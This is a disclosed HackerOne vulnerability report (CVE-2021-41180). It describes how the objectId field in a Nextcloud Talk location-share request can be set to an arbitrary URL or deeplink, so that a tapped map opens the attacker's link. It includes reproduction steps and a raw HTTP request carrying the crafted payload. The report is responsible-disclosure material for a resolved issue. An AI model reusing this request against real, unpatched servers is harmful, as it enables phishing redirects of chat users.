# [M] objectId in share location can be set to open arbitrary URL or Deeplinks

## Summary
Severity: Medium
Program: Nextcloud
Weakness: Business Logic Errors
Reporter: ctulhu
State: resolved
Disclosed: 2022-03-08T16:11:41.630Z
CVE: CVE-2021-41180
Source: https://hackerone.com/reports/1337178

## Details
## Summary:
The NextCloud Talk app allows a user to share their location in the Mobile App.
The objectId= in ```/ocs/v2.php/apps/spreed/api/v1/chat/$token/share``` Can be set to a URL or Deeplink, While the ```metaData=``` will render the map, Once a user clicked the map it will open the defined URL or Deeplink in the crafted request.

For days, I've been thinking and trying different ways to Increase its Severity but i guess im stuck so here i am Reporting this.




## Steps To Reproduce:
Note: Location Sharing is only allowed in the Mobile App.

* 1.) Using the app share your location and Intercept it, The request should be similar to the ```Request``` Below.
* 2.) Alter the ```objectId=``` to whatever URL you want to point it at.
* 3.) Send the Request
* 4.) Using the Mobile app, Click the map and it will redirect you to the url.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

### Request

  ```
POST /ocs/v2.php/apps/spreed/api/v1/chat/wqfqmw9n/share HTTP/2
Host: localhost
Cookie: oc_sessionPassphrase=cookie; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; occi3pyo3vg0=6lheeis7ot8kcnvdgq12ijl90e
Authorization: Basic 
User-Agent: Mozilla/5.0 (Android) Nextcloud-Talk v12.2.1
Accept: application/json
Ocs-Apirequest: true
Content-Type: application/x-www-form-urlencoded
Content-Length: 227
Accept-Encoding: gzip, deflate

objectType=geo-location&objectId=https://ctulhu.me&referenceId=kkk&metaData={"type":"geo-location","id":"geo:14.600765443470294,121.00452968052457","latitude":"14.600765443470294","longitude":"121.00452968052457","name":"hehe"}
```

### Response

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1337178_
